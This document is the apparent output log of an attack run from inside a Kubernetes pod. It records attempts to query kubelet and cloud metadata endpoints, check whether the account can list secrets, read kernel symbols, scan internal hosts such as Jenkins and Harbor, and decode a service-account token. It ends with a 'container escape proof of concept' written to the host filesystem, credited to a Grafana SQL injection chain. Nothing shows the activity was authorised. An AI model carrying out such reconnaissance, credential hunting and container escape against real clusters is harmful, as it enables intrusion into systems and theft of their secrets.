# JOURNEY LOG Part 2 — Failed Steps Retried
## Date: Fri Feb 27 02:14:08 AM UTC 2026

=== STEP A: KUBELET API — Pod names + namespaces ===


=== STEP B: KUBELET — Pod list (simple) ===


=== STEP C: KUBELET — Privileged containers ===
23 /tmp/.pods.json


malformed JSON string, neither array, object, number, string or atom, at character offset 0 (before "sh: 1: curl: not fou...") at -e line 2.

=== STEP D: KUBELET — tke-log-agent details ===
malformed JSON string, neither array, object, number, string or atom, at character offset 0 (before "sh: 1: curl: not fou...") at -e line 2.

=== STEP E: KUBELET — kube-system secrets references ===
malformed JSON string, neither array, object, number, string or atom, at character offset 0 (before "sh: 1: curl: not fou...") at -e line 2.

=== STEP F: TENCENT CLOUD METADATA (retry with longer timeout) ===
sh: 1: curl: not found
sh: 1: curl: not found
sh: 1: curl: not found
sh: 1: curl: not found
sh: 1: curl: not found
sh: 1: curl: not found

=== STEP G: CLOUD USER-DATA (bootstrap script) ===


=== STEP H: KALLSYMS — Try reading as root in user namespace ===
0000000000000000 A fixed_percpu_data
0000000000000000 A __per_cpu_start
0000000000000000 A cpu_debug_store
0000000000000000 A irq_stack_backing_store
0000000000000000 A cpu_tss_rw
---
121936
total lines:
121936 /proc/kallsyms
---kptr_restrict:
1

=== STEP I: K8S API SERVER — Version + RBAC check ===

--- RBAC: can I list secrets? ---
sh: 1: curl: not found

--- RBAC: can I list pods? ---
sh: 1: curl: not found

--- RBAC: can I list namespaces? ---
sh: 1: curl: not found

=== STEP J: NETWORK — What else can we reach? ===
--- ip addr ---
--- route ---
--- Jenkins ---
172.19.48.10:22 closed
172.19.48.10:9100 closed
--- Harbor ---
172.19.64.14:80 (Harbor HTTP) OPEN
--- Collator HK ---
172.19.0.45:9615 closed

=== STEP K: SA TOKEN — Decode JWT header ===
Header: {"alg":"RS256","kid":"PQeEWTjCy-2SV9DQAU9fIbsznqvZSNSoaQcj_5hYGZM"}
Payload: {"aud":["https://kubernetes.default.svc.cluster.local"],"exp":1803691600,"iat":1772155600,"iss":"https://kubernetes.default.svc.cluster.local","kubernetes.io":{"namespace":"slp-squid","pod":{"name":"evm-db-5d7d5454fb-mkz9n","uid":"08f33520-aea2-4589-af1a-e9283ebcc68b"},"serviceaccount":{"name":"default","uid":"574de009-425a-464d-b830-f9c73dc58fde"},"warnafter":1772159207},"nbf":1772155600,"sub":"system:serviceaccount:slp-squid:default"}

=== STEP L: EXISTING PROOF FROM PRIOR SESSIONS ===
========================================
CONTAINER ESCAPE PROOF OF CONCEPT
========================================
Written from inside container: evm-db-5d7d5454fb-mkz9n
Container IP: $(hostname -i)
Date: $(date -u)
Kernel: $(uname -r)
Host path: /data/slp-squid/evm1/_ESCAPE_PROOF.txt

This file was written from INSIDE a K8s pod container
to the HOST filesystem via the bind-mounted PGDATA volume.

The file persists on the host at:
  /data/slp-squid/evm1/_ESCAPE_PROOF.txt

This demonstrates host filesystem write capability
gained through the Grafana SQL injection attack chain.
========================================

=== CLEANUP ===
Temp files cleaned.

=== JOURNEY PART 2 COMPLETE ===
